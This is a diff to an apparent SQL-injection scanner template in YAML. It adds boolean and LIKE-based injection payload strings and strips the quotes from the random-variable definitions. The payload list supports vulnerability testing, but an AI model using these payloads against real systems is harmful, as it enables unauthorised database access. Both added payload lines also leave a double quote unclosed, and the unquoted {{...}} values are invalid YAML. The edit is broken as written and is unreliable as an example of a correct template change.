@@ -26,8 +26,8 @@ http:
         condition: and
 
     variables:
-        randomstr1: '{{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}'
-        randomstr2: '{{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}'
+        randomstr1: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+        randomstr2: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
         randomnum1: {{rand_int(1, 9999)}}
         randomnum2: {{rand_int(1, 9999)}}
 
@@ -81,6 +81,7 @@ http:
             - ")+"
             - ")||'"
             - ")+'"
+            - "OR '{{randomstr1}}'='{{randomstr2}}
             - "AND ({{randomnum1}}={{randomnum1}}"
             - "AND (({{randomnum1}}={{randomnum1}}"
             - "AND ((({{randomnum1}}={{randomnum1}}"
@@ -100,6 +101,7 @@ http:
             - "AND (\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
             - "AND ((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
             - "AND (((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND \"{{randomstr1}}\" LIKE \"{{randomstr1}}
             - "{{randomstr2}}"
         payload:
             - "OR {{randomnum1}}={{randomnum1}}"
